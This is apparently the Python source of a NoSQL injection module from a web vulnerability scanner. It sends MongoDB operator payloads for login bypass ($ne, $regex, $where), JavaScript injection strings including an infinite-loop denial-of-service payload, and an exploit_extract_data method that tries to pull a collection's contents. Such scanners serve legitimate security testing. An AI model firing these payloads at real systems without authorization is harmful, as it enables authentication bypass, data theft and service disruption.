#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - NoSQL Injection Module
NoSQL Injection detection and exploitation
"""

import re
import json


from config import Payloads, Colors


class NoSQLModule:
    """NoSQL Injection Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "NoSQL Injection"
        
        # NoSQL indicators
        self.nosql_indicators = [
            '$ne',
            '$gt',
            '$lt',
            '$regex',
            '$exists',
            '$where',
            'mongodb',
            'bson',
            '_id',
            'ObjectId',
            'MongoError',
        ]
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for NoSQL Injection"""
        # Test operator injection
        self._test_operators(url, method, param, value)
        
        # Test JSON injection
        self._test_json_injection(url, method, param, value)
        
        # Test JavaScript injection
        self._test_js_injection(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for NoSQL Injection"""
        pass
    
    def _test_operators(self, url: str, method: str, param: str, value: str):
        """Test NoSQL operators"""
        payloads = Payloads.NOSQL_PAYLOADS
        
        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            baseline_len = len(baseline.text) if baseline else 0
            baseline_text = baseline.text.lower() if baseline else ''
        except Exception:
            baseline_len = 0
            baseline_text = ''
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text.lower()
                
                # Check for NoSQL error indicators (strong signal)
                error_indicators = ['mongoerror', 'bson', 'objectid', '$where']
                error_count = sum(1 for ind in error_indicators if ind.lower() in response_text)
                
                if error_count >= 1 and error_count > sum(1 for ind in error_indicators if ind.lower() in baseline_text):
                    from core.engine import Finding
                    finding = Finding(
                        technique="NoSQL Injection (Operator-based)",
                        url=url,
                        severity='HIGH',
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence="NoSQL error/operator injection detected",
                    )
                    self.engine.add_finding(finding)
                    return
                
                # Check for authentication bypass by comparing to baseline
                auth_indicators = ['welcome', 'dashboard', 'logged in', 'profile', 'admin']
                if payload in ['{"$ne": null}', '{"$gt": ""}']:
                    response_has_auth = any(ind in response_text for ind in auth_indicators)
                    baseline_has_auth = any(ind in baseline_text for ind in auth_indicators)
                    
                    # Only flag if auth indicators appear in response but NOT in baseline
                    if response_has_auth and not baseline_has_auth:
                        from core.engine import Finding
                        finding = Finding(
                            technique="NoSQL Injection (Auth Bypass)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="Authentication bypass possible with NoSQL operator",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL operator test error: {e}')}")
    
    def _test_json_injection(self, url: str, method: str, param: str, value: str):
        """Test JSON-based NoSQL injection"""
        json_payloads = [
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"$where": "this.password.length > 0"}',
        ]
        
        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            if not baseline:
                return
            baseline_text = baseline.text.lower()
            baseline_len = len(baseline.text)
        except Exception:
            return
        
        # NoSQL-specific indicators that distinguish real injection from normal 200 responses
        nosql_success_indicators = [
            'mongodb', 'mongoerror', 'bson', 'objectid',
            '$ne', '$gt', '$regex', '$where', '_id',
        ]
        auth_bypass_indicators = ['welcome', 'dashboard', 'logged in', 'profile', 'admin']
        
        for payload in json_payloads:
            try:
                headers = {'Content-Type': 'application/json'}
                response = self.requester.request(url, method, data=payload, headers=headers)
                
                if not response:
                    continue
                
                if response.status_code != 200:
                    continue
                
                response_text = response.text.lower()
                response_len = len(response.text)
                
                # Check for NoSQL error indicators that are NEW (not in baseline)
                new_nosql_indicators = sum(
                    1 for ind in nosql_success_indicators
                    if ind.lower() in response_text and ind.lower() not in baseline_text
                )
                
                if new_nosql_indicators >= 1:
                    from core.engine import Finding
                    finding = Finding(
                        technique="NoSQL Injection (JSON-based)",
                        url=url,
                        severity='HIGH',
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence="NoSQL-specific indicators in response to JSON operator payload",
                    )
                    self.engine.add_finding(finding)
                    return
                
                # Check for auth bypass: response must differ significantly from
                # baseline AND contain auth indicators that baseline does not
                response_has_auth = any(ind in response_text for ind in auth_bypass_indicators)
                baseline_has_auth = any(ind in baseline_text for ind in auth_bypass_indicators)
                len_diff = abs(response_len - baseline_len)
                
                if response_has_auth and not baseline_has_auth and len_diff > 100:
                    from core.engine import Finding
                    finding = Finding(
                        technique="NoSQL Injection (JSON-based)",
                        url=url,
                        severity='HIGH',
                        confidence=0.8,
                        param=param,
                        payload=payload,
                        evidence="Auth bypass indicators appeared after JSON operator injection",
                    )
                    self.engine.add_finding(finding)
                    return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL JSON test error: {e}')}")
    
    def _test_js_injection(self, url: str, method: str, param: str, value: str):
        """Test JavaScript injection in NoSQL"""
        js_payloads = [
            "'; return true; var dummy='",
            "'; return '1'=='1'; var dummy='",
            "'; while(true){}; var dummy='",
            "'; sleep(5000); var dummy='",
        ]
        
        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            if not baseline:
                return
            baseline_len = len(baseline.text)
        except Exception:
            return
        
        for payload in js_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for JavaScript execution by comparing response differences
                response_len = len(response.text)
                
                # Only flag if response is significantly different from baseline
                # AND contains indicators of successful injection
                if response.status_code == 200 and abs(response_len - baseline_len) > 50:
                    response_text = response.text.lower()
                    # Look for auth bypass indicators or data leak
                    if any(ind in response_text for ind in ['welcome', 'dashboard', 'logged in', 'profile', 'admin']):
                        from core.engine import Finding
                        finding = Finding(
                            technique="NoSQL Injection (JavaScript)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.75,
                            param=param,
                            payload=payload,
                            evidence="JavaScript code may have been executed - response differs from baseline",
                        )
                        self.engine.add_finding(finding)
                        return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL JS test error: {e}')}")
    
    def exploit_extract_data(self, url: str, param: str, collection: str = 'users') -> list:
        """Attempt to extract data via NoSQL injection"""
        extraction_payloads = [
            f'{{"$where": "return this.collection == \'{collection}\'"}}',
            f'{{"collection": "{collection}"}}',
        ]
        
        results = []
        for payload in extraction_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, 'POST', data=data)
                
                if response:
                    results.append({
                        'payload': payload,
                        'response': response.text,
                    })
            except Exception as e:
                print(f"{Colors.error(f'NoSQL extraction error: {e}')}")
        
        return results
